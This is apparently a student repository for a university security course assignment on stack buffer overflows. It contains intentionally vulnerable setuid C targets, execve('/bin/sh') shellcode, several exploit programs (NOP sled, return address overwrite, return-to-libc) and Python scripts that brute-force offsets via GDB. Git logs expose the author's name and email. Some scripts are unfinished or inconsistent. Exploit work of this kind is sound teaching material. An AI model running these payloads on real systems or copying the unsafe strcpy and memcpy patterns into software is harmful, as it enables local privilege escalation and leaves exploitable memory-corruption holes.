<START OF ./length.py>
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)
print(f"Shellcode length: {len(shellcode)} bytes")

<END OF ./length.py>
<START OF ./calculate_ret_offset.py>
# script: calculate_ret_offset.py
import struct

# Address of the 'temp1' buffer from GDB
temp1_buffer_addr = 0xffffd364

# Address of the saved EIP from GDB
eip_addr = 0xffffd360

# Calculate the offset to the return address
ret_offset = eip_addr - temp1_buffer_addr

print(f"Return address offset: {ret_offset}")
<END OF ./calculate_ret_offset.py>
<START OF ./script.py>
# script: calculate_buffer_size.py
import struct

# Address of the 'temp1' buffer from GDB
temp1_buffer_addr = 0xffffd364

# Address of the saved EBP from GDB
ebp_addr = 0xffffd36c

# Calculate the buffer size
buffer_size = ebp_addr - temp1_buffer_addr + 8

print(f"Buffer size: {buffer_size}")
<END OF ./script.py>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/shellcode_test.c>
#include <stdio.h>
#include <string.h>

char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[]) {
  char buffer[400];
  strcpy(buffer, shellcode);
  ((void (*)())buffer)();
  return 0;
}
<END OF ./cs5435-hw4/shellcode_test.c>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/testGDB.py>
import subprocess
import re

# Define the source code of target0.c
source_code = """
#include <stdio.h>
#include <string.h>

void greeting(char* temp1)
{
    char name[400];
    memset(name, 0, 400);
    strcpy(name, temp1);
    printf("Hi %s\\n", name);
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    greeting(argv[1]);
    printf("Bye %s\\n", argv[1]);
    return 0;
}
"""

# Shellcode to execute
shellcode = (
    b"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
    b"\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
    b"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
    b"\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"
)

print("[+] Compiling the target program...")
# Compile the target program
with open("target0.c", "w") as f:
    f.write(source_code)
subprocess.run(["gcc", "-ggdb", "-mpreferred-stack-boundary=2", "-zexecstack", "-fno-stack-protector", "-no-pie", "-fno-pie", "-m32", "-o", "target0", "target0.c"])
print("[+] Target program compiled.")

print("[+] Running GDB to extract stack pointer and base pointer values...")
# Run GDB and extract the stack pointer and base pointer values
gdb_output = subprocess.check_output(["gdb", "-q", "-ex", "break greeting", "-ex", "run $(python3 -c 'print(\"A\"*400)')", "-ex", "print $esp", "-ex", "print $ebp", "-ex", "quit", "./target0"]).decode()
esp_match = re.search(r"\$1 = \(void \*\) (0x[0-9a-f]+)", gdb_output)
ebp_match = re.search(r"\$2 = \(void \*\) (0x[0-9a-f]+)", gdb_output)

if esp_match and ebp_match:
    esp = int(esp_match.group(1), 16)
    ebp = int(ebp_match.group(1), 16)
    offset = ebp - esp
    print(f"[+] Stack pointer (ESP): 0x{esp:x}")
    print(f"[+] Base pointer (EBP): 0x{ebp:x}")
    print(f"[+] Offset: {offset} bytes")
else:
    print("[-] Failed to extract stack pointer and base pointer values.")
    exit(1)

print("[+] Crafting the exploit buffer...")
# Craft the exploit buffer
nop_sled = b"\\x90" * (400 - len(shellcode))
return_address = esp.to_bytes(4, byteorder='little')
exploit_buffer = nop_sled + shellcode + return_address
print("[+] Exploit buffer crafted.")

print("[+] Writing the exploit buffer to sploit0.c...")
# Write the exploit buffer to sploit0.c
with open("sploit0.c", "w") as f:
    f.write(f"""
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{{
    char *args[3];
    char *env[1];
    char buf[408];

    // Fill the buffer with NOPs
    memset(buf, 0x90, sizeof(buf));

    // Copy the shellcode to the beginning of the buffer
    memcpy(buf, shellcode, strlen(shellcode));

    // Use the address of buffer + an offset to the NOP sled
    *(unsigned int*)(buf + 400) = 0x{esp:x};

    // Null terminate the buffer
    buf[sizeof(buf) - 1] = '\\0';

    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\\n");

    return 0;
}}
""")
print("[+] sploit0.c has been generated.")
<END OF ./cs5435-hw4/testGDB.py>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp());
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xd4\xff\xff";
  args[2] = NULL;
  
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  printf("Buffer created\n");

  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  printf("Buffer populated with addresses\n");
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  printf("Calling execve with target: %s\n", TARGET);
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[4]; 
  char *env[1];

  char str[408];
  memset(str, 0, 408);

  for (int i = 0; i < 203; i++)
  {
  	strcat(str, "\x90");
  }

  strcat(str, shellcode);
  
  for (int i = 0; i < 38; i++)
  {

    strcat(str, "\xb4\xde\xff\xff");

  }
  args[0] = TARGET;
  args[1] = str;

  args[2] = "65935";
  args[3] = NULL;

  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/brute1.py>
import subprocess
import struct

shellcode = "<SHELLCODE>"

stack_start = 0x0  # Replace with the stack start address from the sploit1 program
ebp_offset = 44
eip_offset = 48

for i in range(1, 100):
    nop_sled = b"\x90" * (i * 4)
    
    for j in range(-500, 500, 4):
        eip_address = struct.pack("<I", stack_start + j)
        
        payload = nop_sled + shellcode + b"A" * (ebp_offset - len(nop_sled) - len(shellcode)) + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
        
        with open("payload", "wb") as f:
            f.write(payload)
        
        p = subprocess.Popen(["./sploit1"], stdin=open("payload", "rb"), stdout=subprocess.PIPE)
        output = p.stdout.read().strip()
        
        if b"targetuser" in output:
            print(f"Exploit succeeded with {i*4} byte NOP sled and EIP overwrite {hex(stack_start + j)}")
            print(output.decode())
            break
    else:
        continue
    break
<END OF ./cs5435-hw4/sploits/brute1.py>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);

  for (int i = 0; i < 16; i++)
  {
  	strcat(str, "\x90");
  }

  strcat(str, "\x8f\xdf\xff\xff\x8f\xdf\xff\xff");

  args[0] = TARGET;
  args[1] = str;
  args[2] = NULL;
  
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

const int OFFSET = 408;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const char* RETURN_ADDRESS = 0xffffdb2c;

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[OFFSET + 1];
  memset(buf, '\x90', sizeof(buf));
  buf[OFFSET] = 0;
  memcpy(buf, shellcode, SHELLCODE_LENGTH);
  *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];
  printf("Buffer created\n");

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  // Replace these with the correct offsets and addresses
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;
  printf("Buffer populated with addresses\n");

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  printf("Calling execve with target: %s\n", TARGET);
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/targets/bruteForce0.py>
import subprocess
import re
import time

# The shellcode we want to execute
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

def gdb_run_command(gdb, command):
    print(f"[dbg] Running command: {command.decode('utf-8')}")
    gdb.stdin.write(command + b"\n")
    gdb.stdin.flush()

def gdb_read_output(gdb):
    output = b""
    while True:
        line = gdb.stdout.readline()
        if b"(gdb)" in line:
            break
        output += line
    print(f"[dbg] GDB output:\n{output.decode('utf-8')}")
    return output.decode('utf-8')

def check_gdb_running(gdb):
    gdb_run_command(gdb, b"show version")
    output = gdb_read_output(gdb)
    if "GNU gdb" in output:
        print("[+] GDB is running correctly.")
    else:
        print("[-] GDB is not running correctly. Please check your setup.")
        exit(1)

def find_eip_offset():
    print("[+] Finding offset to EIP...")
    for offset in range(1, 1000):
        print(f"[dbg] Trying offset: {offset}")
        gdb = subprocess.Popen(["gdb", "./target0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Check if GDB is running correctly
        check_gdb_running(gdb)

        # Create a cyclic pattern to identify the offset
        pattern = ("A" * offset).encode('utf-8') + b"BBBBCCCCDDDDEEEE"
        
        # Run the program with the pattern
        gdb_run_command(gdb, b"run " + pattern)
        time.sleep(0.1)  # Add a short delay to allow the program to run
        gdb_run_command(gdb, b"info registers eip")
        output = gdb_read_output(gdb)
        
        # Check if EIP is overwritten with "BBBB" (0x42424242)
        if "0x42424242" in output:
            print(f"[+] Found EIP offset: {offset}")
            
            # Double-check the offset by running again
            print("[dbg] Double-checking the offset...")
            gdb_run_command(gdb, b"run " + pattern)
            time.sleep(0.5)  # Add a short delay to allow the program to run
            gdb_run_command(gdb, b"info registers eip")
            output = gdb_read_output(gdb)
            
            if "0x42424242" in output:
                print("[+] Offset confirmed!")
                return offset
            else:
                print("[-] Offset confirmation failed. Continuing search...")
        
        gdb.stdin.close()
        gdb.wait()
    
    print("[-] Could not find EIP offset!")
    return None

def find_shellcode_address(eip_offset):
    print("[+] Finding shellcode address...")
    gdb = subprocess.Popen(["gdb", "./target0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Check if GDB is running correctly
    check_gdb_running(gdb)
    
    # Create a payload with NOP sled and shellcode
    payload = b"\x90" * (eip_offset - len(shellcode)) + shellcode + b"A" * 4
    
    # Run the program with the payload
    gdb_run_command(gdb, b"run " + payload)
    time.sleep(0.1)  # Add a short delay to allow the program to run
    gdb_run_command(gdb, b"x/40wx $esp")
    output = gdb_read_output(gdb)
    
    # Extract the shellcode address from the output
    match = re.search(r"(0x[\w]+)", output)
    if match:
        shellcode_address = int(match.group(1), 16)
        print(f"[+] Found shellcode address: {hex(shellcode_address)}")
        
        # Verify the shellcode is at the expected location
        print("[dbg] Verifying shellcode location...")
        gdb_run_command(gdb, b"x/16bx " + hex(shellcode_address).encode('utf-8'))
        output = gdb_read_output(gdb)
        
        if re.search(re.escape(shellcode), output.encode('utf-8')):
            print("[+] Shellcode location verified!")
            return shellcode_address
        else:
            print("[-] Shellcode not found at the expected address. Continuing search...")
    else:
        print("[-] Could not find shellcode address!")
        return None

def confirm_exploit(eip_offset, shellcode_address):
    print("[+] Confirming exploit...")
    gdb = subprocess.Popen(["gdb", "./target0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Check if GDB is running correctly
    check_gdb_running(gdb)
    
    # Create the final exploit payload
    exploit = b"\x90" * (eip_offset - len(shellcode)) + shellcode + shellcode_address.to_bytes(4, byteorder='little')
    
    # Set a breakpoint at the shellcode address
    gdb_run_command(gdb, b"break *" + hex(shellcode_address).encode('utf-8'))
    
    # Run the program with the exploit
    gdb_run_command(gdb, b"run " + exploit)
    time.sleep(0.5)  # Add a short delay to allow the program to run
    output = gdb_read_output(gdb)
    
    # Check if we hit the breakpoint in our shellcode
    if "Breakpoint" in output:
        print("[+] Exploit successful! Shellcode reached.")
        
        # Verify the shellcode is being executed
        print("[dbg] Verifying shellcode execution...")
        gdb_run_command(gdb, b"stepi")
        output = gdb_read_output(gdb)
        
        if "execve" in output:
            print("[+] Shellcode execution confirmed!")
        else:
            print("[-] Shellcode execution not confirmed.")
    else:
        print("[-] Exploit failed. Shellcode not reached.")

# Main execution flow
print("[+] Starting exploit development process...")

eip_offset = find_eip_offset()
if eip_offset:
    print(f"[+] EIP offset found: {eip_offset}")
    shellcode_address = find_shellcode_address(eip_offset)
    if shellcode_address:
        print(f"[+] Shellcode address found: {hex(shellcode_address)}")
        confirm_exploit(eip_offset, shellcode_address)
    else:
        print("[-] Failed to find shellcode address. Exploit development aborted.")
else:
    print("[-] Failed to find EIP offset. Exploit development aborted.")

print("[+] Exploit development process completed.")
<END OF ./cs5435-hw4/targets/bruteForce0.py>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./cs5435-hw4/targets/auto.py>
import subprocess

# Constants
TARGET = "./target0"
SHELLCODE = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)
BUFFER_SIZE = 400
SHELLCODE_LEN = 63
RETURN_ADDRESS = b"\x30\xd3\xff\xff"  # Example address, adjust as needed

def test_exploit(nop_length):
    total_return_length = BUFFER_SIZE - nop_length - SHELLCODE_LEN - 1  # -1 for null terminator
    if total_return_length < 0:
        return "Invalid configuration"
    
    nop_sled = b"\x90" * nop_length
    return_count = total_return_length // len(RETURN_ADDRESS)
    extra_bytes = total_return_length % len(RETURN_ADDRESS)  # Calculate leftover space after full return addresses

    # Construct the payload
    payload = nop_sled + SHELLCODE + (RETURN_ADDRESS * return_count) + (b"\x90" * extra_bytes)  # Fill leftover space with NOPs
    payload += b'\x00'  # Null terminator to ensure string ends properly

    # Ensure the payload length matches the buffer size
    assert len(payload) == BUFFER_SIZE, f"Payload size mismatch: {len(payload)} != {BUFFER_SIZE}"

    # Run the program with the payload
    try:
        output = subprocess.check_output([TARGET], input=payload)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return "Crash or runtime error"


# Main testing loop
for nop_len in range(336):  # Up to the maximum space available for NOP sled
    result = test_exploit(nop_len)
    print(f"Testing NOP length: {nop_len}, Result: {result}")

<END OF ./cs5435-hw4/targets/auto.py>
<START OF ./.git/ORIG_HEAD>
cad4c2c4894bf477bae7d0e5703bd38bf1691d59

<END OF ./.git/ORIG_HEAD>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/master

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
may 7

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/FETCH_HEAD>
5746bcf1af256636fc9b4484b52b68f3d0bad8e7		branch 'master' of https://github.com/justinhalford/h4

<END OF ./.git/FETCH_HEAD>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 cad4c2c4894bf477bae7d0e5703bd38bf1691d59 justinhalford <justinhalford@gmail.com> 1715056911 -0400	commit (initial): Initial commit
cad4c2c4894bf477bae7d0e5703bd38bf1691d59 6b5e2d36e11f82e981dfb9d9e562382ab5d5f329 justinhalford <justinhalford@gmail.com> 1715057233 -0400	commit: may 7
6b5e2d36e11f82e981dfb9d9e562382ab5d5f329 6b52d920be904342743bc52f5283be7ef56eae28 justinhalford <justinhalford@gmail.com> 1715057265 -0400	commit: may 7
6b52d920be904342743bc52f5283be7ef56eae28 fc7bcfb142ac289645f3012d8377ca15593b0ed7 justinhalford <justinhalford@gmail.com> 1715057423 -0400	commit: may 7
fc7bcfb142ac289645f3012d8377ca15593b0ed7 131729f14385ce7a74925d2a8ee93c653a2137e5 justinhalford <justinhalford@gmail.com> 1715058257 -0400	commit: may 7
131729f14385ce7a74925d2a8ee93c653a2137e5 bf6aa01858cc6622a4f134d5d010ec907d759847 justinhalford <justinhalford@gmail.com> 1715058380 -0400	commit: may 7
bf6aa01858cc6622a4f134d5d010ec907d759847 4a2aa6fcbdd20ace63a54afbd1c17330e8253fa2 justinhalford <justinhalford@gmail.com> 1715058495 -0400	commit: may 7
4a2aa6fcbdd20ace63a54afbd1c17330e8253fa2 6da6145038289d4872a60d9a0728d7f5722c1e7e justinhalford <justinhalford@gmail.com> 1715184681 -0400	commit: may 7
6da6145038289d4872a60d9a0728d7f5722c1e7e ed76eb8fa2137011a3c245c44661420662e4d88b justinhalford <justinhalford@gmail.com> 1715184763 -0400	commit: may 7
ed76eb8fa2137011a3c245c44661420662e4d88b 4c14069ad413015e3d9e687bdf7a6f5812538985 justinhalford <justinhalford@gmail.com> 1715184816 -0400	commit: may 7
4c14069ad413015e3d9e687bdf7a6f5812538985 52d40054ee31216b277921fbca88392e6fc3f9ea justinhalford <justinhalford@gmail.com> 1715184945 -0400	commit: may 7
52d40054ee31216b277921fbca88392e6fc3f9ea ce095e1f12869e3e2d60a5e19108271a68891095 justinhalford <justinhalford@gmail.com> 1715185075 -0400	commit: may 7
ce095e1f12869e3e2d60a5e19108271a68891095 da246f0e90bbfa6addd21db5234c0dfa3317b3cd justinhalford <justinhalford@gmail.com> 1715186402 -0400	commit: may 7
da246f0e90bbfa6addd21db5234c0dfa3317b3cd 8c57d100f3f31578f8165810814d6bc44febf41a justinhalford <justinhalford@gmail.com> 1715186501 -0400	commit: may 7
8c57d100f3f31578f8165810814d6bc44febf41a 4dece92b441da20d9b841dd61191dffaec6806ce justinhalford <justinhalford@gmail.com> 1715186519 -0400	commit: may 7
4dece92b441da20d9b841dd61191dffaec6806ce 73f01328a80b88ed2cf817a17896ce2dce525444 justinhalford <justinhalford@gmail.com> 1715186593 -0400	commit: may 7
73f01328a80b88ed2cf817a17896ce2dce525444 df95dc664d7fe5002a93f3266ef28c8c3c6a54ae justinhalford <justinhalford@gmail.com> 1715188011 -0400	commit: may 7
df95dc664d7fe5002a93f3266ef28c8c3c6a54ae f522e2bb5970b25eca74af115217282340e58d30 justinhalford <justinhalford@gmail.com> 1715188327 -0400	commit: may 7
f522e2bb5970b25eca74af115217282340e58d30 3b49c83e1129a6cd845606d4da86c048ee8f5609 justinhalford <justinhalford@gmail.com> 1715188404 -0400	commit: may 7
3b49c83e1129a6cd845606d4da86c048ee8f5609 26608f753932ec0cfef53d5eb3957707fcd2a875 justinhalford <justinhalford@gmail.com> 1715189245 -0400	commit: may 7
26608f753932ec0cfef53d5eb3957707fcd2a875 09020f24e04b82de69aeb23714a15f70c72275fd justinhalford <justinhalford@gmail.com> 1715308954 -0400	commit: may 7
09020f24e04b82de69aeb23714a15f70c72275fd 64aa83b27a9a0f198095cc25bfdc8c45d3346934 justinhalford <justinhalford@gmail.com> 1715313202 -0400	commit: may 7
